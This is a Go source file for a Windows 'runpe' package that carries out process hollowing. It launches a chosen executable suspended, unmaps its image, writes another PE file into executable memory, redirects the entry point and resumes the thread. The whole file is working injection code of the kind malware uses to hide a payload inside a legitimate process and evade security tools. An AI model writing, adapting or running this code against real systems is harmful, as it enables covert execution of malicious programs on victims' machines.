//go:build windows && amd64
// +build windows,amd64

package runpe

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"unsafe"
)

type IMAGE_REL_BASED uint16

// Inject starts the src process and injects the target process.
func Inject(srcPath, destPath string, console bool) {

	cmd, err := windows.UTF16PtrFromString(srcPath)
	if err != nil {
		panic(err)
	}

	Log("[*] Creating process: %v", srcPath)

	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	var flag uint32
	CREATE_SUSPENDED := 0x00000004
	CREATE_NEW_CONSOLE := 0x00000010
	if console {
		flag = uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
	} else {
		flag = uint32(CREATE_SUSPENDED)
	}
	err = windows.CreateProcess(cmd, nil, nil, nil, false, flag, nil, nil, si, pi)
	if err != nil {
		panic(err)
	}

	hProcess := pi.Process
	hThread := pi.Thread

	Log("[+] Process created. Process: %v, Thread: %v", hProcess, hThread)

	Log("[*] Getting thread context of %v", hThread)
	ctx, err := GetThreadContext(uintptr(hThread))
	if err != nil {
		panic(err)
	}
	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	Log("[+] Address to PEB[Rdx]: %x", Rdx)

	//https://bytepointer.com/resources/tebpeb64.htm
	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		panic(err)
	}

	Log("[+] Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)

	Log("[*] Reading destination PE")
	destPE, err := ioutil.ReadFile(destPath)
	if err != nil {
		panic(err)
	}

	destPEReader := bytes.NewReader(destPE)
	if err != nil {
		panic(err)
	}

	f, err := pe.NewFile(destPEReader)

	Log("[*] Getting OptionalHeader of destination PE")
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		panic("OptionalHeader64 not found")
	}

	Log("[+] ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
	Log("[*] Unmapping view of section %x", baseAddr)
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		panic(err)
	}

	Log("[*] Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)
	// MEM_COMMIT := 0x00001000
	// MEM_RESERVE := 0x00002000
	// PAGE_EXECUTE_READWRITE := 0x40
	newImageBase, err := VirtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
	if err != nil {
		panic(err)
	}
	Log("[+] New base address %x", newImageBase)
	Log("[*] Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		panic(err)
	}

	for _, sec := range f.Sections {
		Log("[*] Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
		secData, err := sec.Data()
		if err != nil {
			panic(err)
		}
		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			panic(err)
		}
	}
	Log("[*] Calculating relocation delta")
	delta := int64(oh.ImageBase) - int64(newImageBase)
	Log("[+] Relocation delta: %v", delta)

	Log("[*] Writing new ImageBase to Rdx %x", newImageBase)
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	if err != nil {
		panic(err)
	}

	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	Log("[*] Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

	Log("[*] Setting thread context %v", hThread)
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		panic(err)
	}

	Log("[*] Resuming thread %v", hThread)
	_, err = ResumeThread(hThread)
	if err != nil {
		panic(err)
	}

}

var (
	modkernel32 = windows.NewLazyDLL("kernel32.dll")

	procVirtualAllocEx   = modkernel32.NewProc("VirtualAllocEx")
	procGetThreadContext = modkernel32.NewProc("GetThreadContext")
	procSetThreadContext = modkernel32.NewProc("SetThreadContext")
	//procResumeThread       = modkernel32.NewProc("ResumeThread")

	modntdll = windows.NewLazyDLL("ntdll.dll")

	procNtUnmapViewOfSection = modntdll.NewProc("NtUnmapViewOfSection")
)

func ResumeThread(hThread windows.Handle) (count int32, e error) {

	// DWORD ResumeThread(
	// 	HANDLE hThread
	// );

	ret, err := windows.ResumeThread(hThread)
	if ret == 0xffffffff {
		e = err
	}

	count = int32(ret)
	Log("[*] ResumeThread[%v]", hThread)
	return
}

func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {

	// LPVOID VirtualAllocEx(
	// 	HANDLE hProcess,
	// 	LPVOID lpAddress,
	// 	SIZE_T dwSize,
	// 	DWORD  flAllocationType,
	// 	DWORD  flProtect
	//  );

	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	Log("[*] VirtualAllocEx[%v : %x]", hProcess, lpAddress)

	return
}

func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {

	// BOOL ReadProcessMemory(
	// 	HANDLE  hProcess,
	// 	LPCVOID lpBaseAddress,
	// 	LPVOID  lpBuffer,
	// 	SIZE_T  nSize,
	// 	SIZE_T  *lpNumberOfBytesRead
	//  );

	var numBytesRead uintptr
	data = make([]byte, size)

	err := windows.ReadProcessMemory(windows.Handle(hProcess),
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}

	Log("[*] ReadProcessMemory[%v : %x]", hProcess, lpBaseAddress)
	return
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []byte, size uint32) (e error) {

	// BOOL WriteProcessMemory(
	// 	HANDLE  hProcess,
	// 	LPVOID  lpBaseAddress,
	// 	LPCVOID lpBuffer,
	// 	SIZE_T  nSize,
	// 	SIZE_T  *lpNumberOfBytesWritten
	// );

	var numBytesRead uintptr

	err := windows.WriteProcessMemory(hProcess,
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}
	Log("[*] WriteProcessMemory[%v : %x]", hProcess, lpBaseAddress)

	return
}

func GetThreadContext(hThread uintptr) (ctx []uint8, e error) {

	// BOOL GetThreadContext(
	// 	HANDLE    hThread,
	// 	LPCONTEXT lpContext
	// );

	ctx = make([]uint8, 1232)

	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	//other offsets can be found  at https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	Log("[*] GetThreadContext[%v]", hThread)

	return ctx, nil
}

func ReadProcessMemoryAsAddr(hProcess windows.Handle, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := ReadProcessMemory(uintptr(hProcess), lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	Log("[*] ReadProcessMemoryAsAddr[%v : %x]: [%x]", hProcess, lpBaseAddress, val)
	return
}

func NtUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {

	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
	// https://msdn.microsoft.com/en-us/windows/desktop/ff557711
	// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html

	// NTSTATUS NtUnmapViewOfSection(
	// 	HANDLE    ProcessHandle,
	// 	PVOID     BaseAddress
	// );

	r, _, err := procNtUnmapViewOfSection.Call(uintptr(hProcess), baseAddr)
	if r != 0 {
		e = err
	}
	Log("[*] NtUnmapViewOfSection[%v : %x]", hProcess, baseAddr)
	return
}

func SetThreadContext(hThread windows.Handle, ctx []uint8) (e error) {

	// BOOL SetThreadContext(
	// 	HANDLE        hThread,
	// 	const CONTEXT *lpContext
	// );

	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(uintptr(hThread), uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	Log("[*] SetThreadContext[%v]", hThread)
	return
}

func Log(format string, args ...interface{}) {
	fmt.Printf(format+"\n", args...)
}
